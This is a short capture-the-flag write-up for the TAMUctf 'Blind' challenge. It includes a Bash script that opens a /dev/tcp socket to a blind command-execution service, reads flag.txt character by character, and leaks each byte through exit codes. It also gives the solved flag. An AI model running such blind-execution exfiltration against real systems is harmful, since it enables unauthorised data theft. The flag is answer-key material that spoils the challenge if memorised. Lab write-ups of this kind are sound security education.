# TAMUctf_Blind
Write up of the challenge Blind from TAMUctf
## Recon
I connected to `nc challenges.tamuctf.com 3424`

I got back the prompt `Execute:`

When Typing a command a number is returned. I figured out that this must be the Linux/ UNIX exit codes.

After playing around for a bit I found out that typing `cat flag.txt` returns 0, meaning the operation was successful and a flag.txt file exists in the current directory.

## Solution
My plan was to return the flag over these error codes, since you're able to send numbers up to 255 with the `exit` command.

I wrote a short Bash script to extract the flag as decimal numbers:
```bash
#!/usr/bin/env bash

exec 3<>/dev/tcp/challenges.tamuctf.com/3424;                             #Setting up a Socket

for i in {1..30}
do
        #Convert each Byte and send exit with error code
        echo "exit \$(printf '%d' \"'\$(cat flag.txt|cut -c$i-$i)\")" >&3 
done
cat <&3
```
It sends this command `exit \$(printf '%d' \"'\$(cat flag.txt|cut -c$i-$i)\")` for the server to get executed.
I get the flag with cat `flag.txt` pipe that to `cut -c$i-$i` because I can only extract one letter at a time.
The letter gets converted to its decimal equivalent with `printf '%d' "'[Output from cat and cut]'`.

Now all that is left is to convert the flag back to ASCII and you get:
`gigem{r3v3r53_5h3ll5}`
